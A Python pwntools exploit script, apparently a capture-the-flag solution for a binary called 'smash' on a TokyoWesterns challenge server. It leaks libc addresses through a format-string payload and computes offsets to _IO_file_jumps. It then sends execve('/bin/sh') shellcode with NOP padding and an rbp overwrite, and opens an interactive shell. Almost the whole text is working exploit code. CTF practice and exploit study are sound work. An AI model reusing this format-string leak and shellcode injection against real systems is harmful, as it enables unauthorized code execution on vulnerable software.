from pwn import *
import sys

context.clear(os='linux', arch='amd64')
#context.log_level='debug'

__author__ = 'yuvaly0'

argv = sys.argv
binary_path = './smash'
REMOTE = 'remote' in argv
DEBUG = 'debug' in argv

if REMOTE:
	sh = remote('pwn01.chal.ctf.westerns.tokyo', 29246)
else:
	sh = process([binary_path])

if DEBUG:
	gdb.attach(sh, """
		b* 0x555555555295
		c
		""")

e = ELF(binary_path)

# ------------- plan -----------
# overwrite rbp with _IO_new_file_finish + 8
# write shellcode to executable heap

libc_leak_offset = 9

sh.sendlineafter('> ', '%p ' * 9)
leaks = sh.recvline(keepends=False).split(' ')[:-1]

libc_leak = int(leaks[libc_leak_offset - 1], 16)

# calculating offset using libc db
# from libc ELF object did not work

libc_base = libc_leak - 0x0270b3
libc_io_file_jumps = libc_base + 0x1ed4a0
log.info('[+] libc leak: {}'.format(hex(libc_leak)))
log.info('[+] libc base: {}'.format(hex(libc_base)))
log.info('[+] wanted rbp: {}'.format(hex(libc_io_file_jumps)))

rbp_offset = 45
payload =  '\xf3\x0f\x1e\xfa'
payload += '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
payload += '\x90' * (48 - len(payload))

payload += p64(libc_io_file_jumps + 0x10 + 8)

sh.sendafter('] ', payload)

sh.interactive()